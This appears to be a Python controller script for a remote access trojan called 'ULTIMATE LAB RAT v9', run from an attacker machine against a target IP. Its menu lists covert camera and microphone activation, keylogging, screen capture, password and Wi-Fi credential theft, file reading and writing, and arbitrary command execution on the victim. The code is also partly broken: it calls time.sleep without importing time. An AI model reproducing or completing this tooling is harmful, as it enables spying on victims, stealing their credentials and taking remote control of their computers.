# =============================================
#  controller.py → RUN ON YOUR ATTACKER MACHINE
#  Full 35-Command Menu Controller
# =============================================
import socket

def send(cmd, extra=""):
    with socket.socket() as s:
        s.connect((target, 5000))
        s.recv(1024)  # banner
        s.sendall(cmd.encode())
        if extra: time.sleep(0.2); s.sendall(extra.encode())
        print(s.recv(99999).decode(errors='ignore'))

menu = """
╔══════════════════════════════════════════════════════════╗
║                  ULTIMATE LAB RAT v9                     ║
╚══════════════════════════════════════════════════════════╝
(1) Turn on camera           (2) Turn off camera
(3) Turn on mic              (4) Turn off mic
(5) Start keylogger          (6) Stop keylogger
(7) Show keylogger results   (8) Capture screen
(9) List files in directory  (10) Read file
(11) Write to file           (12) List processes
(13) Kill process by PID     (14) Scan network
(15) Execute command         (16) Get system info
(17) Network interfaces      (18) Active connections
(19) Route table             (20) DNS cache
(21) Fetch passwords         (22) Reboot computer
(23) Freeze screen           (24) Rick Roll
(25) Record audio            (26) Move mouse
(27) Click mouse             (28) Get Wi-Fi passwords
(29) Installed software      (30) Recent files
(31) Startup items           (32) Scheduled tasks
(33) User accounts           (34) System events
(35) Fetch content from URL
"""

target = input("Target IP: ")
while True:
    print(menu)
    c = input("Choice (1-35): ").strip()
    if c in ["1","2","4","5","6","7","8","22","23","24","27"]: send(c)
    elif c == "15": send(c, input("Command: "))
    elif c in ["9","10","13","26","35"]: send(c, input("Input: "))
    elif c == "11":
        path = input("Path: ")
        content = input("Content: ")
        send(c, f"{path}\n{content}")
    else: print("Coming soon or invalid")
